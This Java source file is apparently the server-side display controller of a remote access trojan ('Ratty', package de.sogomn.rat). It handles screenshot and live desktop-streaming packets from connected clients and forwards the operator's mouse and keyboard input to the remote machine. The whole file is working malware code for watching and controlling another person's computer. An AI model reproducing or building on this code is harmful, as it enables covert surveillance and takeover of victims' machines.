package de.sogomn.rat.server.gui;

import java.awt.image.BufferedImage;

import de.sogomn.rat.packet.DesktopPacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.KeyEventPacket;
import de.sogomn.rat.packet.MouseEventPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.util.FrameEncoder.IFrame;

final class DisplayController implements ISubController {
	
	private ServerClient client;
	
	private DisplayPanel displayPanel;
	
	public DisplayController(final ServerClient client) {
		this.client = client;
		
		displayPanel = new DisplayPanel();
		
		final String title = client.connection.getAddress();
		
		displayPanel.addListener(this);
		displayPanel.setTitle(title);
	}
	
	private void handleDesktopPacket(final DesktopPacket packet) {
		final boolean streamingDesktop = client.isStreamingDesktop();
		
		if (!streamingDesktop) {
			return;
		}
		
		final IFrame[] frames = packet.getFrames();
		final int screenWidth = packet.getScreenWidth();
		final int screenHeight = packet.getScreenHeight();
		final DesktopPacket desktop = new DesktopPacket();
		
		client.connection.addPacket(desktop);
		displayPanel.showFrames(frames, screenWidth, screenHeight);
	}
	
	@Override
	public void userInput(final String command) {
		if (command == RattyGui.DESKTOP) {
			final DesktopPacket packet = new DesktopPacket(true);
			
			client.connection.addPacket(packet);
		} else if (command == RattyGui.SCREENSHOT) {
			final ScreenshotPacket packet = new ScreenshotPacket();
			
			client.connection.addPacket(packet);
		} else if (command == DisplayPanel.MOUSE_EVENT) {
			final MouseEventPacket packet = displayPanel.getLastMouseEventPacket();
			
			client.connection.addPacket(packet);
		} else if (command == DisplayPanel.KEY_EVENT) {
			final KeyEventPacket packet = displayPanel.getLastKeyEventPacket();
			
			client.connection.addPacket(packet);
		}
	}
	
	@Override
	public void handlePacket(final IPacket packet) {
		if (packet instanceof ScreenshotPacket) {
			final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
			final BufferedImage image = screenshot.getImage();
			
			displayPanel.showImage(image);
		} else if (packet instanceof DesktopPacket) {
			final DesktopPacket desktop = (DesktopPacket)packet;
			
			handleDesktopPacket(desktop);
		}
	}
	
}
